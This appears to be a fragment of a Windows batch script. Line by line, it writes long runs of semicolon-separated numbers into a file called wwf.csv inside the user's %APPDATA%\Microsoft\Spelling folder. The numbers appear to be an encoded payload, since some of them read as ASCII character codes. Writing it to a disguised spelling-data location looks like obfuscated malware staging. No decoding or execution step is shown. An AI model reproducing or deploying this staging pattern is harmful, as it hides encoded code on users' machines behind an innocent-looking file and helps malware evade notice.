>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(550.0;7567.395;0.449;0.60;35.2459;687.0;570.0;367.0;7577.695;0.472;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.0978;808.0;812.0;395.0;8905.779;0.817;0.816;0.8530;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;816.0;8409.655;0.597;0.50;35.0436;687.0;770.0;567.0;0385.795;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.472;0.801;0.6480;808.0;812.0;695.0;1208.779;0.817;0.816;0.5067;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;817.0;816.0;9642.655;0.798;0.60;33.5105;587.0;770.0;667.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3718.395;0.572;0.801;0.2050;808.0;812.0;595.0;1805.679;0.817;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6917;812.0;817.0;816.0;0007.453;0.60;33.787;0.8336;370.0;467.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(395.0;6770.472;0.801;0.808;0.2423;812.0;495.0;479.0;5767.817;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.812;0.0912;817.0;816.0;754.0;2430.30;29.387;0.470;0.0055;767.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(495.0;472.0;3433.801;0.808;0.812;0.0656;695.0;473.0;810.0;3153.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.816;0.3167;50.31;487.0;470.0;3632.467;0.695;0.472;0.5646;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;808.0;812.0;9964.795;0.573;0.810;0.1913;812.0;817.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8865.649;0.30;31.487;0.0630;770.0;567.0;395.0;8038.572;0.801;0.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5669;812.0;695.0;473.0;4305.810;0.812;0.817;0.1937;816.0;450.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.31;0732.687;0.470;0.667;0.5890;795.0;372.0;801.0;9478.808;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.795;0.9010;573.0;810.0;812.0;4512.817;0.816;0.551;0.1761;60.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(787.0;470.0;0902.367;0.795;0.472;0.8999;801.0;808.0;812.0;3567.595;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.773;0.810;0.2662;812.0;817.0;816.0;5222.452;0.60;31.787;0.9688;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(370.0;367.0;595.0;3106.572;0.801;0.808;0.3179;812.0;795.0;373.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9538.810;0.812;0.817;0.7942;816.0;553.0;40.31;3087.687;0.670;0.367;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6870;795.0;472.0;801.0;6463.808;0.812;0.395;0.5034;673.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;2752.817;0.816;0.654;0.3283;60.31;687.0;670.0;0695.667;0.395;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.772;0.7577;801.0;808.0;812.0;0028.595;0.773;0.810;0.5227;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;816.0;5702.655;0.70;31.387;0.8619;770.0;567.0;795.0;3513.372;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.808;0.6198;812.0;495.0;673.0;4723.810;0.812;0.817;0.3379;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;456.0;50.31;3297.687;0.570;0.467;0.3207;695.0;572.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6854.808;0.812;0.695;0.3685;673.0;810.0;812.0;6415.817;0.816;0.557;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4661;60.33;587.0;370.0;8589.667;0.495;0.772;0.5890;801.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;2340.395;0.473;0.810;0.6504;812.0;817.0;816.0;0941.449;0.748;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.70;33.8349;387.0;670.0;467.0;6257.395;0.472;0.801;0.7334;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;595.0;6627.673;0.810;0.812;0.3568;817.0;816.0;449.0;2254.549;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;33.787;0.4352;370.0;767.0;695.0;0250.672;0.801;0.808;0.4795;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;795.0;373.0;6304.810;0.812;0.817;0.8381;816.0;549.0;450.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2662.60;33.687;0.770;0.3876;367.0;495.0;672.0;7508.801;0.808;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5878;695.0;373.0;810.0;6766.812;0.817;0.816;0.8616;349.0;451.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.47;2672.487;0.370;0.767;0.3906;795.0;572.0;801.0;4332.808;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.695;0.5634;367.0;811.0;800.0;2411.801;0.571;0.801;0.2149;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;814.0;1993.397;0.816;0.805;0.7486;811.0;810.0;50.31;0133.687;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.770;0.567;0.2461;595.0;672.0;801.0;4068.808;0.812;0.695;0.4781;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(368.0;801.0;698.0;8775.817;0.803;0.549;0.4748;60.33;487.0;670.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7309.667;0.395;0.672;0.9442;801.0;808.0;812.0;7371.495;0.678;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2649;567.0;811.0;800.0;7296.801;0.649;0.40;33.1042;387.0;670.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(367.0;9099.795;0.372;0.801;0.7640;808.0;812.0;695.0;3546.378;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.367;0.5447;811.0;800.0;801.0;8359.450;0.30;41.687;0.5404;370.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(667.0;695.0;0148.372;0.801;0.808;0.3978;812.0;495.0;567.0;1770.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.699;0.1211;807.0;784.0;821.0;7895.812;0.801;0.815;0.0806;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(549.0;50.41;787.0;6662.470;0.367;0.395;0.0635;572.0;801.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1413.812;0.395;0.367;0.6486;804.0;801.0;599.0;7070.807;0.584;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2692;812.0;801.0;815.0;6507.450;0.60;35.587;0.7407;570.0;567.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(395.0;4019.372;0.801;0.808;0.4036;812.0;595.0;676.0;9219.397;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.803;0.5209;817.0;697.0;803.0;8840.801;0.50;37.687;0.0891;370.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(767.0;795.0;7696.672;0.801;0.808;0.0141;812.0;795.0;376.0;0038.797;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.803;0.2239;817.0;797.0;803.0;7856.801;0.349;0.30;37.9588;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(587.0;670.0;367.0;9618.495;0.772;0.801;0.3534;808.0;812.0;395.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1278.676;0.497;0.810;0.0143;803.0;817.0;697.0;2208.803;0.801;0.550;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1547;30.47;787.0;470.0;1232.367;0.595;0.572;0.8369;801.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;6680.495;0.582;0.811;0.5601;811.0;816.0;478.0;1095.797;0.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.0145;815.0;812.0;797.0;4120.599;0.801;0.349;0.2644;60.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(587.0;470.0;7203.467;0.795;0.772;0.3149;801.0;808.0;812.0;8768.595;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.782;0.811;0.2706;811.0;816.0;478.0;5433.497;0.809;0.801;0.7036;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;812.0;697.0;6685.799;0.801;0.750;0.3479;50.47;387.0;770.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7136.567;0.595;0.672;0.6050;801.0;808.0;812.0;2548.795;0.382;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2972;811.0;816.0;478.0;4554.597;0.809;0.801;0.3352;815.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.0;6273.399;0.801;0.551;0.7023;50.27;687.0;570.0;7613.767;0.395;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.572;0.1792;801.0;808.0;812.0;8829.595;0.377;0.805;0.6255;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(399.0;70.29;2936.787;0.370;0.767;0.1556;595.0;572.0;801.0;2608.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.812;0.495;0.8293;477.0;805.0;815.0;3054.399;0.549;0.60;29.6663;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(587.0;570.0;567.0;7486.795;0.472;0.801;0.1891;808.0;812.0;395.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4142.377;0.805;0.815;0.7206;799.0;350.0;30.29;6665.487;0.470;0.567;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.5325;795.0;672.0;801.0;6353.808;0.812;0.795;0.4940;677.0;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;6742.399;0.551;0.40;21.0732;378.0;811.0;776.0;3253.811;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.8122;576.0;811.0;810.0;5758.803;0.70;23.778;0.6103;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(576.0;811.0;5768.803;0.811;0.483;0.1055;804.0;811.0;814.0;3569.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.40;21.778;0.0206;811.0;787.0;797.0;0157.814;0.810;0.676;0.7125;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;810.0;803.0;6371.50;23.778;0.811;0.2903;487.0;797.0;814.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8963.810;0.783;0.804;0.1548;811.0;814.0;816.0;5818.50;9.384;0.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7987;817.0;801.0;60.11;2235.570;0.397;0.808;0.4230;815.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.21;9564.778;0.811;0.767;0.9986;811.0;800.0;801.0;0269.476;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.810;0.5552;803.0;60.23;678.0;2361.811;0.767;0.811;0.4086;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;783.0;4439.804;0.811;0.814;0.0449;816.0;50.49;773.0;2315.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.818;0.397;0.2587;808.0;805.0;800.0;4287.778;0.811;0.367;0.4123;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;800.0;801.0;8243.583;0.819;0.805;0.6922;816.0;499.0;804.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0595.386;0.797;0.808;0.7225;817.0;801.0;40.15;4911.747;0.810;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2020;499.0;811.0;800.0;9176.801;0.60;17.532;0.6281;747.0;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;3301.399;0.811;0.800;0.9763;801.0;40.1;60.29;1877.467;0.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.6787;499.0;807.0;384.0;2430.821;0.812;0.801;0.7028;815.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(476.0;811.0;1086.810;0.803;0.60;31.3534;667.0;804.0;801.0;1335.399;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.807;0.784;0.4107;821.0;812.0;801.0;4758.815;0.583;0.804;0.9260;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;814.0;816.0;4891.40;57.573;0.810;0.0638;818.0;697.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4490.805;0.800;0.767;0.5439;804.0;801.0;499.0;0756.807;0.584;0.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2622;812.0;801.0;815.0;7288.583;0.819;0.805;0.9162;816.0;499.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(804.0;7746.586;0.397;0.808;0.4973;817.0;801.0;60.23;5850.747;0.599;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.804;0.5976;801.0;399.0;807.0;2815.816;0.821;0.812;0.0536;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;50.25;3413.532;0.547;0.799;0.8328;804.0;801.0;499.0;6585.807;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.821;0.0820;812.0;801.0;815.0;2871.30;21.368;0.801;0.2723;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(798.0;817.0;803.0;3909.483;0.804;0.811;0.2587;814.0;816.0;70.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2860.783;0.819;0.805;0.7574;816.0;599.0;804.0;9508.773;0.815;0.577;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6705;805.0;815.0;815.0;6157.805;0.810;0.803;0.1775;30.53;568.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;9906.808;0.805;0.809;0.6311;805.0;816.0;801.0;3499.814;0.777;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.697;0.4720;821.0;678.0;811.0;5310.816;0.783;0.816;0.0340;497.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;816.0;8611.383;0.819;0.805;0.1041;816.0;599.0;804.0;9986.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.461;0.70;3.2935;744.0;70.3;546.0;4100.40;35.778;0.811;0.9915;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(373.0;810.0;812.0;8291.817;0.816;0.815;0.4024;383.0;812.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8511.399;0.805;0.802;0.9349;805.0;801.0;800.0;6463.30;9.446;0.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4341;808.0;808.0;40.9;8912.346;0.801;0.820;0.9436;801.0;50.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(471.0;9086.801;0.810;0.801;0.8934;814.0;497.0;816.0;4512.801;0.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.369;0.5925;814.0;814.0;811.0;1095.814;0.815;0.40;5.9947;310.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(410.0;60.39;1450.367;0.811;0.809;0.8027;812.0;805.0;808.0;9795.697;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.805;0.7539;811.0;810.0;770.0;4269.805;0.810;0.805;0.1128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;804.0;801.0;6293.800;0.40;31.667;0.3771;811.0;809.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9820.805;0.808;0.801;0.3630;814.0;786.0;801.0;4267.814;0.815;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8513;811.0;810.0;70.23;0892.586;0.805;0.815;0.2319;817.0;497.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;9018.466;0.397;0.815;0.4139;805.0;499.0;70.0;6361.943;10.470;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(16.398;136.3309;596.67;886.60;436.211;1495.816;123.382;28.30;4.8417;432.1;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.8;65.32;1119.61;1.617;13.74;32.1624;41.1;72.4;732.1;9291.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.55;32.72;1.8534;714.14;53.32;40.1;5444.75;32.41;1.417;81.5921;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(35.0;60.18;828.193;1841.57;32.42;1.314;18.9051;828.193;54.0;40.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7125.801;5.77;2.418;8.7293;714.6;732.2;614.14;1860.418;101.49;0.63;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.7155;618.128;901.14;329.28;0695.74;7.41;18.48;3.0534;732.0;38.4;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.1;1934.58;14.47;7.53;18.6520;809.14;318.113;44.32;3234.40;18.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3.532;0.7807;514.6;60.3;514.14;3697.314;14.53;32.70;2.5708;62.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(514.15;37.9;0371.518;117.518;109.614;29.3593;514.8;714.14;614.18;8045.813;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.732;1.329;14.2750;729.3;34.0;71.14;6436.414;8.50;3.58;14.4574;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(514.17;828.217;44.32;9254.41;14.78;3.47;1.4297;314.4;70.1;71.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8875.57;32.62;2.714;17.6967;828.217;614.7;38.18;0028.817;18.809;14.629;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.6347;78.14;714.18;813.12;6119.47;7.718;109.414;29.4051;714.8;414.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(318.113;7083.45;32.51;14.729;3.7657;54.32;50.18;817.5;8994.67;2.714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(18.805;4.0113;432.1;78.3;75.0;0831.31;14.629;14.57;0.6006;64.14;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(714.14;514.14;8729.53;0.30;1.54;32.3926;41.2;414.5;60.2;5294.314;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.714;5.632;2.4340;414.14;414.6;77.3;7021.529;14.48;14.512;7.0119;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(79.14;614.14;529.14;0471.78;14.614;14.614;7.7772;721.18;821.2;714.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1474.396;5.332;1.52;19.0061;40.6;632.1;519.1;8089.519;0.73;7.31;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8.7720;64.32;41.3;38.5;2493.432;1.58;29.73;5.3612;532.2;714.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(78.4;2221.67;1.318;125.72;6.8085;53.4;70.1;72.14;8981.44;7.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.38;5.8040;632.0;318.128;893.5;7081.532;2.48;14.48;10.6229;67.5;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(729.14;518.128;9429.833;8.714;8.76;32.3259;71.18;828.133;614.7;2178.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2.61;19.70;19.3607;61.7;621.18;828.141;6753.61;18.696;5.432;1.0564;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(41.19;70.45;67.19;2282.518;105.618;117.518;128.4980;849.18;828.153;58.8;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2613.78;21.317;128.857;1.5388;618.96;718.96;618.109;4235.614;18.813;14.329;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(14.2050;318.128;833.18;828.161;2448.718;128.865;18.828;169.4990;514.9;632.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(421.17;7101.828;157.31;19.70;7.8721;521.17;828.157;71.18;5608.496;4.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.619;0.4097;66.32;52.1;629.14;5743.68;9.532;2.518;128.3921;945.18;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.29;514.5;2840.432;0.418;128.949;5.8375;632.0;618.128;861.3;2953.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.628;12.47;2.4051;518.128;881.21;618.128;0129.877;2.514;14.68;0.7979;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(61.18;828.129;517.129;6118.79;9.50;2.52;18.2379;828.129;518.128;829.6;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0605.70;1.328;18.828;129.3885;37.21;518.128;877.2;2582.614;14.78;0.52;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(28.7464;518.128;829.29;528.16;4474.47;4.718;128.881;28.4168;52.21;618.128;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(877.2;8666.514;18.828;181.76;0.2850;62.1;328.16;42.17;3899.521;18.828;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(177.72;18.3427;828.129;421.18;828.177;4111.72;14.718;128.881;8.3308;632.2;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(62.19;30.16;9788.719;1.39;21.418;128.9305;877.2;314.18;828.181;0680.64;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.51;1.728;7.2447;37.2;717.112;718.128;9269.889;6.332;1.528;18.9202;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(828.129;54.7;41.17;3171.812;8.883;122.392;86.2414;425.52;924.137;48.49;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2138.891;56.686;173.554;78.6157;453.128;860.0;436.0;7340.70;4.828;0.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(148.9230;70.0;60.6;52.0;4527.30;0.536;0.60;82.7663;683.65;749.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(34.0;3032.60;1.30;1.70;181.4946;952.144;931.2;827.103;6756.835;30.819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(58.843;222.2259;837.56;900.29;912.2;0295.886;101.885;32.429;96.8425;589.62;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(850.196;846.101;9374.630;136.856;193.463;20.6996;421.235;881.63;872.17;1034.449;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(174.311;211.551;197.3789;938.96;733.103;445.151;9900.324;234.649;168.874;189.0499;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(413.160;37.47;737.216;7488.825;186.811;201.515;253.8484;389.142;912.218;653.228;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9151.376;57.840;69.467;7.5191;932.227;659.132;338.20;5374.561;174.901;245.850;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(131.1872;811.151;900.247;571.80;6924.929;151.792;100.926;24.9196;859.69;922.244;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(807.42;8035.543;18.671;173.895;101.3171;643.245;895.8;65.93;2473.869;34.678;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.4745;573.0;810.0;812.0;7889.817;0.816;0.815;0.7874;483.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;801.0;0151.799;0.805;0.802;0.5515;805.0;801.0;800.0;0179.758;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(77.60;105.50;115.4715;40.115;40.105;50.110;1419.40;103.70;70.50;105.8723;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.108;30.101;60.83;1193.40;112.30;101.30;99.3631;70.105;60.102;40.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6774.60;99.40;97.40;116.6272;30.105;40.111;60.110;4011.60;69.70;114.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.9213;30.111;30.114;50.38;6434.783;0.811;0.817;0.4375;814.0;599.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;0203.370;0.805;0.808;0.1894;801.0;773.0;815.0;5400.673;0.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.818;0.6505;797.0;808.0;805.0;1574.800;0.552;85.70;110.8141;60.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;60.99;4354.50;111.70;103.50;110.9273;70.105;30.122;70.101;4343.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.40;83.50;111.6912;40.117;60.114;50.99;5234.40;101.50;70.40;105.8939;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.108;60.101;40.84;5218.50;121.40;112.30;101.9020;30.50;587.0;770.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1263.367;0.395;0.382;0.8193;811.0;811.0;816.0;5376.578;0.797;0.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.4991;801.0;815.0;812.0;7731.397;0.599;0.801;0.7801;695.0;387.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.0;6388.814;0.810;0.805;0.5642;810.0;803.0;548.73;7816.70;110.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(118.40;97.7122;70.108;60.105;40.100;7564.60;84.40;97.40;114.0789;70.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;70.116;9515.50;83.30;119.60;105.7037;50.116;50.99;70.104;2524.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.30;97.50;108.9464;60.117;60.101;40.40;7178.576;0.805;0.798;0.5734;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.0;697.0;814.0;0675.821;0.480;0.397;0.9843;816.0;804.0;373.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0314.815;0.373;0.810;0.9841;818.0;597.0;808.0;1655.805;0.800;0.646;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(73.6398;40.110;50.118;30.97;0947.70;108.50;105.60;100.0643;50.68;40.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.98;4090.60;117.70;103.40;83.2657;60.119;50.105;30.116;4133.30;99.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.40;86.3108;70.97;40.108;30.117;3247.50;101.50;54.773;0.6366;810.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(818.0;697.0;5001.808;0.805;0.800;0.0500;768.0;801.0;808.0;8961.697;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.821;0.483;0.6068;805.0;803.0;810.0;6413.383;0.819;0.805;0.5160;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;599.0;804.0;2502.386;0.597;0.808;0.8444;817.0;801.0;752.73;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2132.50;110.40;118.40;97.7100;30.108;40.105;40.100;8605.30;76.50;97.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.8819;50.103;60.117;40.97;0697.60;103.50;101.40;83.2808;60.119;40.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.116;4697.30;99.50;104.40;86.7657;50.97;30.108;70.117;0612.70;101.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(26.485;0.8851;810.0;807.0;810.0;8433.811;0.819;0.810;0.3992;383.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(819.0;805.0;5449.816;0.599;0.804;0.7235;730.83;60.119;30.105;0129.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.70;99.70;104.6619;30.73;60.115;50.77;1841.70;105.30;115.40;115.2684;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.105;30.110;70.103;4045.30;52.468;0.801;0.5257;808.0;805.0;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2783.805;0.816;0.801;0.6832;814.0;777.0;697.0;3397.821;0.578;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.2414;816.0;383.0;816.0;3148.497;0.814;0.816;0.2684;483.0;819.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;7405.816;0.699;0.804;0.1039;418.87;70.70;40.67;4942.70;95.50;
